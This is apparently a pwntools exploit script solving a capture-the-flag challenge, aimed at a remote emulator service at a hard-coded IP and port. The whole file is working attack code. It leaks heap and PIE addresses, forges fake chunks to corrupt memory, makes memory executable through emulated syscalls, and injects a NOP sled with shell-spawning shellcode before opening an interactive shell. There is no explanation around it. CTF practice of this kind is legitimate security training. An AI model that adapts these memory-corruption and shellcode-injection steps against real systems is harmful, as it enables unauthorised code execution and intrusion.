from pwn import *

context.log_level = 'debug'
# r = process('./chall')
r = remote('13.231.207.73', 9006)
elf = ELF('./chall')

go = lambda x:r.sendlineafter(': ', str(x))

def syscall(rax, rdi, rsi, rdx):
    r.sendlineafter('syscall: ', str(rax))
    go(rdi)
    go(rsi)
    go(rdx)

syscall(12, 0, 0, 0)
heap_leak = int((r.recvuntil(': '),r.recvuntil('='))[1][:-1],16)

heap_base = heap_leak - 0x21000
emu_addr = heap_base + 0x11e78 #0x11e60
log.info('heap leak : 0x%x' % heap_leak)
log.info('heap base : 0x%x' % heap_base)

syscall(10, heap_base, 0x21000, 7)
syscall(20, 1, emu_addr+0x10, 0x100)

fake_chunk = p64(emu_addr+0x10) + p64(0x100)
fake_chunk += p64(0xf171) + p64(0)
fake_chunk += p64(emu_addr-0x10) + p64(0x100)
syscall(19, 0, emu_addr+0x10, 0x100)
r.send(fake_chunk)

syscall(20, 1, emu_addr+0x10+0x20, 0x100)
r.recvuntil('=\n')
pie_leak = u64(r.recvuntil('\n')[8:0x10])
pie_base = pie_leak - 0x202ce0
emu_syscall = pie_base + 0x1290
setbuf_got = pie_base + elf.got['setbuf']
exit_got = pie_base + elf.got['exit']
log.info('pie leak : 0x%x' % pie_leak)
log.info('pie base : 0x%x' % pie_base)

fake_chunk = p64(emu_addr+0x10) + p64(0x100)
fake_chunk += p64(0xf171) + p64(0)
fake_chunk += p64(pie_base + 0x173d) + p64(0x100)
syscall(19, 0, emu_addr+0x10, 0x100)
r.send(fake_chunk)

syscall(10, pie_base, 0x2000, 7)
syscall(19, 0, emu_addr+0x10+0x20, 0x100)
shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
r.send('\x90' * 30 + shellcode)

r.interactive()